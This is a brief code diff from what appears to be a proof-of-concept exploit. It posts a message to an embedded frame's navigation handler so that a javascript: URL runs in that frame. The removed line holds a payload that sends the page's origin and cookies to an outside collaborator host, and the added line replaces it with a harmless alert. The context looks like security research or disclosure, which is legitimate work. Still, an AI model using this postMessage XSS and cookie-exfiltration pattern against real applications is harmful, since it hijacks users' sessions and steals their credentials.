@@ -25,7 +25,7 @@ components.html("""
         try {
             f.contentWindow.postMessage({
                 eventKey: "__SAMOOHA__NAVIGATE_TO_URL",
-                data: { auth_url: "javascript:fetch('https://kwk8biun0tbifxh84s3axlo2rtxklb90.oastify.com/?o='+encodeURIComponent(location.origin)+'&ck='+encodeURIComponent(document.cookie))" }
+                data: { auth_url: "javascript:alert(document.domain)" }
             }, "*");
             console.log("[+] postMessage enviado");
         } catch (e) {
